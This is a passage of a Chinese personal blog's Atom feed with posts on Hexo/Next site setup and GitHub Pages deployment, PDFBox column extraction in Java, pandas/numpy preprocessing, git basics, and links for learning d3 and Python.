rel="noopener">Next官方文档</a></p><p><strong>下面是配置环节。</strong></p><blockquote><p>在 Hexo 中有两份主要的配置文件，其名称都是 _config.yml。 其中，一份位于站点根目录下，主要包含 Hexo 本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。</p></blockquote><p>上面这段话是Next网站的一句话。配置的时候一定要注意这两个文件，文件名都是一样的，别弄混淆了，可以这样理解：</p><ul><li>根目录下的_config.yml是全局的变量设置，就是无论更换什么主题，这一块的内容是不变的。</li><li>themes文件夹里的主题目录下的_config.yml文件中配置的是该主题所特有的个性化设置。</li></ul><p>结合上面两个官方文档基本上就能把站点配个七七八八了，然后有几个小的细节说一下。</p><p><strong>1、Next添加博客的更新时间</strong></p><p>现在网上有很多文章是在原有的swig文件中添加一些dom标签，实际上我现在使用的是 Next 5.1.4版本，其中就已经包含了博客更新时间的选项。只需要在主题配置文件_config.yml搜索update选项，在post_meta选项中应该可以找到一项updated_at，将其设置为true即可。（题外话，其实很多设置，小伙伴们可以先在该文件中搜索一下，比如评论相关的配置，就搜索一下comment，如果有的话就不用到处查资料了。）</p><p><strong>2、hexo新增页面</strong><br>比如说我要自定义一个页面project放在menu中，方法和<a href="https://theme-next.iissnan.com/theme-settings.html#tags-page" target="_blank" rel="noopener">官网给出的tags、categories建立页面</a>是一样的，只不过就是index.md文件中没有type这个选项，tags和categories页面的功能都是给提供好的。比如我要新建一个页面project来写我的近期工作。就可以使用来新建一个页面，这个页面和新建一个文章还不是一样的。内容的组织结构可以是一样的。这个时候在source文件夹下面就有一个名为project的目录，下有一个index.md的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;project&quot;</span><br></pre></td></tr></table></figure></p><p><strong>3、Next添加多个分类目录</strong><br>这个看一下<a href="http://aiellochan.com/2018/02/13/hexo/Hexo-%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%A4%9A%E4%B8%AA-categories/" target="_blank" rel="noopener">aiellochan</a>写的这篇文章。<br>注意区分子分类和多个分类的区别。</p><p><strong>子分类</strong>，下面的分类配置会将该文章放到 Sports/Baseball 这个分类下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line">  - Sports</span><br><span class="line">  - Baseball</span><br></pre></td></tr></table></figure></p><p>同样的作用还可以这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">categories: [Sports,Baseball]</span><br></pre></td></tr></table></figure></p><p>上面两种写法最终的效果都是一样的，都是将文章放在了一个子分类目录下。</p><p><strong>多个分类</strong>,如果我们的要求是将文章同时分到两个或者多个不同的类目下呢？官方给出的方法是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line">  - [Sports]</span><br><span class="line">  - [Baseball]</span><br></pre></td></tr></table></figure></p><p>只需要用中括号将独立的分类括起来即可，这样上面的文章就会被分类在 Sports 和 Baseball 这两个不同的目录中了。</p><h2 id="二、将该博客发布到github上去"><a href="#二、将该博客发布到github上去" class="headerlink" title="二、将该博客发布到github上去"></a>二、将该博客发布到github上去</h2><p><strong>1、建立一个repo</strong><br>名称为xxxx.github.io，这样就可以使用xxxx.github.io这个域名来访问你的站点了。</p><p><strong>2、部署</strong><br>在根目录下的_config.yml文件中有一个配置项deploy，在里面配置上上面这个库的地址。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/yyyy/xxxx.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure></p><p>注意这里，这里的branch要用master分支，这样你的站点才能成为一个Github Page，官网这一块写的是建议是用public作为部署的分支，但是这样将branch配置为非master分支后，站点是访问不到的。<a href="https://hexo.io/zh-cn/docs/deployment" target="_blank" rel="noopener">官方上部署部分的其他方面</a>写的还是很清晰的。</p><p>配置完毕后，使用<code>hexo clean</code>和<code>hexo deploy</code>命令就可以把站点部署到github上了。等待几分钟就可以访问了。</p><h2 id="三、站点主题更新的问题"><a href="#三、站点主题更新的问题" class="headerlink" title="三、站点主题更新的问题"></a>三、站点主题更新的问题</h2><p>当站点部署完毕后，加入主题的部分地方有更改，那么该怎么同步到github上呢。<br>其实也很简单，对有改动的页面重新生成新的页面，然后再推送到github库。这里有没有感觉到其实就是github的git。使用<code>hexo generate -d</code>或者<code>hexo g -d</code>即可将更新后的站点提交到github上。（发布文章用这两条命令就行。）</p><p><strong>注意哦</strong><br>这里有个cache的问题，可能大家会发现为什么已经重新部署了刷新页面还是没有改变，其实这是因为浏览器缓存的原因，只需要清除浏览器最近的cache就可以了。（可能是因为是静态的网站，所以cache缓存的较多？）</p><h2 id="四、在文章中嵌入可视化图表"><a href="#四、在文章中嵌入可视化图表" class="headerlink" title="四、在文章中嵌入可视化图表"></a>四、在文章中嵌入可视化图表</h2><p>下图是d3的一个柱状图demo，可以实现增加或删除的操作。怎么做呢？实际上只需要在你的文章中嵌入JavaScript脚本的代码即可，前文说到了 Markdown就是html的变体，因此它也支持在文章中直接加上各类dom标签。</p><p>下面是嵌入的代码示例和图表类型<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"bar"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/css/custom/main.css"</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">"/js/src/d3.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script src=<span class="string">"/js/custom/bar.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><div id="bar"></div></p><p><link rel="stylesheet" href="/css/custom/main.css"></p><script src="/js/src/d3.min.js"></script><script src="/js/custom/bar.js"></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做毕业设计做的有点累，好久没写博客了，写篇博客放松一下。最近面临毕业了，之前在腾讯云搭建的个人站点，服务器也不能使用学生优惠的价格购买了，遂在今天借这个机会把博客迁移到github上来。之前有一次自己的云服务器的数据库被撞库了，又没有备份，丢失了很多的文章，也是心痛。使
      
    
    </summary>
    
      <category term="开发环境" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
      <category term="Next" scheme="http://yoursite.com/tags/Next/"/>
    
  </entry>
  
  <entry>
    <title>如何使用PDFbox抽取分列的PDF页面</title>
    <link href="http://yoursite.com/2019/05/07/20190507-pdfbox/"/>
    <id>http://yoursite.com/2019/05/07/20190507-pdfbox/</id>
    <published>2019-05-07T08:32:17.000Z</published>
    <updated>2019-11-02T12:21:41.701Z</updated>
    
    <content type="html"><![CDATA[<p>在尝试抽取PDF文档的内容时，了解到了Java下面有个PDFbox的工具包，整体使用的效果还是不错的。在解决本文的主要问题前，先了解一下PDF这种半结构化的文档。</p><p><strong>PDF Structure</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">|----------------------------+</span><br><span class="line">| --------------------------|</span><br><span class="line">| |        Header        | |  &lt;-----文件头，表示版本.%PDF-<span class="number">1</span>.M</span><br><span class="line">| |                      | |</span><br><span class="line">| --------------------------|</span><br><span class="line">| |                      | |</span><br><span class="line">| |         Body         | |  &lt;-----文件体，由一系列PDF对象组成</span><br><span class="line">| |                      | |</span><br><span class="line">| |                      | |</span><br><span class="line">| --------------------------|</span><br><span class="line">| |    Cross-reference   | |  &lt;-----交叉引用表，包含指向所有间接</span><br><span class="line">| |         table        | |        对象的文件位置索引的列表</span><br><span class="line">| |        (xref)        | |</span><br><span class="line">| --------------------------|</span><br><span class="line">| |        Trailer       | |  &lt;-----包含文件的根节点信息和</span><br><span class="line">| |                      | |        文件解析的起点信息</span><br><span class="line">| --------------------------|</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p>本文主要解决的问题是针对有两列或者多列的页面，提取其中的文字。这一点根据 @mkl的提示，实现了基本的demo。<br>在Stack Overflow上有一个也是关于PDF文档多列抽取的问题，PDF文档的处理是一项复杂的工程，现在还尚未有非常成熟的一套解决方案。Java平台上的开源工具 PDFbox和商业服务iText相对而言做的比较完整，但对于的文档还需要定义额外的提取规则。这里是 stackoverflow 下的问题及 @mkl 的回答。<a href="https://stackoverflow.com/questions/26233387/extract-pdf-text-by-columns" target="_blank" rel="noopener">extract PDF text by columns</a></p><blockquote><p>PDFBox does not analyze the page content to recognize columns. If you do the analysis, though, it allows you to extract text column by column if you provide the column rectangles as reguions.</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder pdfText = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="comment">// 重写 writeString(String, List&lt;TextPosition&gt;)方法以加载更多文本的信息，</span></span><br><span class="line"><span class="comment">// 增加使用字体的名称来扩展文本信息</span></span><br><span class="line">PDFTextStripperByArea stripper = <span class="keyword">new</span> PDFTextStripperByArea()；</span><br><span class="line"></span><br><span class="line">stripper.setSortByPosition(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 定位到左边一栏的页面</span></span><br><span class="line">Rectangle rectLeft = <span class="keyword">new</span> Rectangle(<span class="number">10</span>, <span class="number">60</span>, <span class="number">320</span>, <span class="number">820</span>);</span><br><span class="line"><span class="comment">// 定位到右边一栏的页面</span></span><br><span class="line">Rectangle rectRight = <span class="keyword">new</span> Rectangle(<span class="number">330</span>, <span class="number">60</span>, <span class="number">320</span>, <span class="number">820</span>);</span><br><span class="line"></span><br><span class="line">stripper.addRegion(<span class="string">"leftColumn"</span>, rectLeft);</span><br><span class="line"></span><br><span class="line">stripper.addRegion(<span class="string">"rightColumn"</span>, rectRight);</span><br><span class="line"></span><br><span class="line">PDPageTree allPages = document.getDocumentCatalog().getPages();</span><br><span class="line"><span class="keyword">int</span> pageNumber = document.getNumberOfPages();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">String leftText = <span class="string">""</span>;</span><br><span class="line">String rightText = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pageNumber; i++) &#123;</span><br><span class="line"></span><br><span class="line">    PDPage page = (PDPage) allPages.get(i);</span><br><span class="line"></span><br><span class="line">    stripper.extractRegions(page);</span><br><span class="line">    leftText = stripper.getTextForRegion(<span class="string">"leftColumn"</span>);</span><br><span class="line">    rightText = stripper.getTextForRegion(<span class="string">"rightColumn"</span>);</span><br><span class="line"></span><br><span class="line">    pdfText.append(leftText);</span><br><span class="line">    pdfText.append(rightText);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">"Page number "</span>+ i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中这里的列的边界，是不断尝试获取的。</p><p>在做毕业设计的时候，看到一篇关于 寻找PDF文档区域边界的方法。论文题目是 Improving the Extraction of Text in PDFs by Simulating the Human Reading Order。通篇读下来，感觉这种方法还是很可靠地，近期会对论文中提到的算法进行复现。</p><hr><p>很多同学对于上面代码中的 PDFTextStripperByArea类的重写比较感兴趣，我在这里贴一下代码吧。这里主要实现的是 把抽取出来的文本根据字体以及字号的不同打上标签，便于内容的提取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PDFTextStripper stripper = <span class="keyword">new</span> PDFTextStripper() &#123;</span><br><span class="line"></span><br><span class="line">    String prevBaseFont = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">float</span> prevFontSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">writeString</span><span class="params">(String text, List&lt;TextPosition&gt; textPositions)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (TextPosition position : textPositions) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获得该区域文本的字体名以及字体大小，根据这两点进行抽取</span></span><br><span class="line">            <span class="keyword">float</span> fontSize = position.getFontSize();</span><br><span class="line"></span><br><span class="line">            String baseFont = position.getFont().getName();</span><br><span class="line">            <span class="keyword">if</span> (baseFont != <span class="keyword">null</span> &amp;&amp; !baseFont.equals(prevBaseFont) &amp;&amp; !(fontSize==prevFontSize)) &#123;</span><br><span class="line"></span><br><span class="line">                builder.append(<span class="string">'['</span>).append(baseFont).append(<span class="string">'|'</span>).append(fontSize).append(<span class="string">']'</span>);</span><br><span class="line">                prevBaseFont = baseFont;</span><br><span class="line">                prevFontSize = fontSize;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            builder.append(position.getUnicode());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        writeString(builder.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在尝试抽取PDF文档的内容时，了解到了Java下面有个PDFbox的工具包，整体使用的效果还是不错的。在解决本文的主要问题前，先了解一下PDF这种半结构化的文档。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PDF Structure&lt;/strong&gt;&lt;/p&gt;
&lt;figure class
      
    
    </summary>
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="PDFbox" scheme="http://yoursite.com/tags/PDFbox/"/>
    
  </entry>
  
  <entry>
    <title>通过 Tipdm 的数据处理获得的数据预处理的一些个方法及流程。</title>
    <link href="http://yoursite.com/2019/04/16/%E9%80%9A%E8%BF%87%20Tipdm%20%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%8E%B7%E5%BE%97%E7%9A%84%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%AA%E6%96%B9%E6%B3%95%E5%8F%8A%E6%B5%81%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/04/16/通过 Tipdm 的数据处理获得的数据预处理的一些个方法及流程/</id>
    <published>2019-04-16T12:31:04.000Z</published>
    <updated>2019-12-10T14:36:13.146Z</updated>
    
    <content type="html"><![CDATA[<p><strong>对时间序列的处理</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 pands 的 to_datetime 方法，可以将字符类型的时间字段转换为时间字段</span></span><br><span class="line">vehicle[<span class="string">'location_time'</span>] = pd.to_datetime(vehicle[<span class="string">'location_time'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将时间字段补点，按照 1s 的频度</span></span><br><span class="line">grouper = pd.Grouper(key=<span class="string">'location_time'</span>, freq=<span class="string">'1s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 reset_index() 重新建立 dataframe 的索引</span></span><br><span class="line">res = vehicle.groupby(grouper).first().reset_index()</span><br></pre></td></tr></table></figure></p><p><strong>NAN值的处理</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 dataframe中的 "lng","lat","gps_speed" 三列转换为 二维的 numpy 数组</span></span><br><span class="line">lng_lat = res[[<span class="string">"lng"</span>,<span class="string">"lat"</span>,<span class="string">"gps_speed"</span>]].values</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 np.isnan 函数判断该数组中为值为 NAN 的项，并返回一个 True/False 形成的数组</span></span><br><span class="line">isnull_state = np.isnan(lng_lat)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 np.where 函数找到 isnull_state 中为True的索引（行号和列号），通常和 np.isnan 联合使用</span></span><br><span class="line">nan_index = np.array(sorted(list(set(np.where(isnull_state)[<span class="number">0</span>]))))</span><br></pre></td></tr></table></figure></p><p><strong>pandas中行列索引</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对于一个DataFrame A，A.loc[k]是读取A中index为k的那一行。A.iloc[k]是读取A中的第k行。</span></span><br><span class="line">lng = np.array([test_vehicle.loc[i][<span class="string">"lng"</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2500</span>,<span class="number">2700</span>)])</span><br></pre></td></tr></table></figure></p><p><strong>numpy数组的初始化及删除</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化一个二维的数组，并赋值为0，现在未找到可以直接创建一个空的二维数组的方法</span></span><br><span class="line">all_point_distance = np.array([[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]])</span><br><span class="line"><span class="comment"># 再通过 np.delete 函数删除第一行。多说一句，axis=0 是对行操作，axis=1 是对列进行操作</span></span><br><span class="line">all_point_distance = np.delete(all_point_distance,<span class="number">0</span>,axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之所以这样做，是因为有数组合并的需求。如下，这样就可以把同样是二维数组的 distance 中的元素添加到 all_point_distance</span></span><br><span class="line">all_point_distance = np.concatenate((all_point_distance,distance))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;对时间序列的处理&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="数据处理" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/"/>
    
      <category term="pandas" scheme="http://yoursite.com/tags/pandas/"/>
    
  </entry>
  
  <entry>
    <title>正确使用git的姿势</title>
    <link href="http://yoursite.com/2019/03/20/use-git-clearly/"/>
    <id>http://yoursite.com/2019/03/20/use-git-clearly/</id>
    <published>2019-03-20T03:25:43.000Z</published>
    <updated>2019-10-24T12:39:02.730Z</updated>
    
    <content type="html"><![CDATA[<p>在今天，决定从此正式将日常的代码发布到自己的GitHub上，并为此创建了一个新的GitHub账号——flowerlake。在使用的过程中，其实一直有一些问题没有搞清楚git的使用。本篇文章记录一下使用git中遇见的问题及解决方法。</p><p>有两种方式来上传到GitHub上：<br>1、使用开发工具自带的版本控制插件<br>比如 webstorm自带的版本控制。这个首先在 File-&gt;Setting-&gt;GitHub, 在里面输入Host、账号和密码即可。git注意配置一下本机的git路径。</p><p><img src="https://www.getyo.cn/wp-content/uploads/2019/03/webstormSetting.jpg" alt></p><p>File-&gt;Setting-&gt;Version Control-&gt;GitHub</p><p>2、 在控制台中使用git进行版本控制<br>git init（初始化项目）<br>git add filename.xxx (这里是文件，文件夹的话需要在add后面加上-f)<br>git commit “some words to describe this modification”<br>git push -u origin master (这里是指上传到当前的master分支)  </p><p>创建一个初始的仓库后会有怎么上传代码的提示，这里就不再赘述。<br>还有一个问题如下：</p><p>在push的过程中，出现了这个错误。<br><a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>: Permission denied (publickey). fatal: Could not read from remote repository.<br>这是因为在创建完本地的ssh私钥之后，GitHub那边的服务器并没有连接你的钥匙，这样两者是无法进行通信的，因此在使用ssh-kengen船舰私钥之后还要把私钥的内容加入到你的GitHub账号里。在GitHub上具体的描述。<br>解决链接：<br><a href="https://help.github.com/en/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" target="_blank" rel="noopener">https://help.github.com/en/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent</a></p><p>另附上git的官网学习链接： <a href="https://git-scm.com/book/zh/v2/" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在今天，决定从此正式将日常的代码发布到自己的GitHub上，并为此创建了一个新的GitHub账号——flowerlake。在使用的过程中，其实一直有一些问题没有搞清楚git的使用。本篇文章记录一下使用git中遇见的问题及解决方法。&lt;/p&gt;
&lt;p&gt;有两种方式来上传到GitHu
      
    
    </summary>
    
      <category term="自然语言处理" scheme="http://yoursite.com/categories/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86/"/>
    
    
      <category term="nlp" scheme="http://yoursite.com/tags/nlp/"/>
    
  </entry>
  
  <entry>
    <title>2018年度感悟</title>
    <link href="http://yoursite.com/2019/01/20/20190120-2018/"/>
    <id>http://yoursite.com/2019/01/20/20190120-2018/</id>
    <published>2019-01-20T01:28:16.000Z</published>
    <updated>2019-05-14T08:21:41.415Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="闲言碎语" scheme="http://yoursite.com/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"/>
    
    
  </entry>
  
  <entry>
    <title>d3学习资源（持续更新）</title>
    <link href="http://yoursite.com/2019/01/20/20190120-d3/"/>
    <id>http://yoursite.com/2019/01/20/20190120-d3/</id>
    <published>2019-01-20T01:23:32.000Z</published>
    <updated>2019-05-14T07:31:32.838Z</updated>
    
    <content type="html"><![CDATA[<p>知乎学习经验<a href="https://www.zhihu.com/question/22171866" target="_blank" rel="noopener">https://www.zhihu.com/question/22171866</a></p><p>YouTube上的视频<a href="https://www.youtube.com/watch?v=8jvoTV54nXw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=8jvoTV54nXw</a>  </p><p>博客网站（by 馒头华华）<a href="http://d3.decembercafe.org/pages/lessons/2.html" target="_blank" rel="noopener">http://d3.decembercafe.org/pages/lessons/2.html</a>  </p><p>svg教程（first to learn）<a href="http://www.runoob.com/svg/svg-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/svg/svg-tutorial.html</a>  </p><p>observe学习网站（d3 gallery）<a href="https://beta.observablehq.com/" target="_blank" rel="noopener">https://beta.observablehq.com/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;知乎学习经验&lt;a href=&quot;https://www.zhihu.com/question/22171866&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.zhihu.com/question/22171866&lt;/a&gt;&lt;/p&gt;
&lt;p
      
    
    </summary>
    
      <category term="数据可视化" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/"/>
    
    
      <category term="D3" scheme="http://yoursite.com/tags/D3/"/>
    
  </entry>
  
  <entry>
    <title>2017年年度总结</title>
    <link href="http://yoursite.com/2018/11/06/20181106-2017/"/>
    <id>http://yoursite.com/2018/11/06/20181106-2017/</id>
    <published>2018-11-06T06:59:15.000Z</published>
    <updated>2019-05-14T08:20:49.352Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="闲言碎语" scheme="http://yoursite.com/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"/>
    
    
  </entry>
  
  <entry>
    <title>（总结）python在各领域的应用</title>
    <link href="http://yoursite.com/2018/07/06/%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89python%E5%9C%A8%E5%90%84%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>http://yoursite.com/2018/07/06/（总结）python在各领域的应用/</id>
    <published>2018-07-06T07:25:55.000Z</published>
    <updated>2019-12-10T14:35:41.925Z</updated>
    
    <content type="html"><![CDATA[<p>按照Python的几个应用点来总结的。</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul><li><a href="https://www.liaoxuefeng.com/" target="_blank" rel="noopener">廖雪峰</a>的网站</li></ul><p>很好的Python、JavaScript、Git学习网站，使用的时候建议配上Chrome的插件adblock。有时候也可以充当一个函数查找的功能，有一些内置函数的介绍和例子。 我的Python学习之路就是从这里开始的，别的书也没怎么看过。</p><h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><ul><li><a href="http://www.icourse163.org/learn/BIT-1001870001?tid=1001962001#/learn/announce" target="_blank" rel="noopener">Python网络爬虫与信息提取</a></li></ul><p>这个课是在中国大学MOOC上的，老师是北理的嵩天老师，老师讲课一幅很稳的样子，老师本文讲课说话的水平也很高。当然这个只是入门。同时，嵩天老师在中国大学MOOC上也有很多其他Python学习的视频，可以根据自己的兴趣学习，其他的一些我都没有完整看完，所以在此处不做推荐。我之所以没有看完，不是因为讲的不好，是因为我个人的惰性原因。</p><ul><li>一本书 ：Python网络数据采集</li></ul><p>emmm、我有电子版的书籍。我基本上是跟着全书的做了一遍，书的质量也很高。</p><ul><li><a href="http://scrapy-chs.readthedocs.io/zh_CN/latest/intro/overview.html" target="_blank" 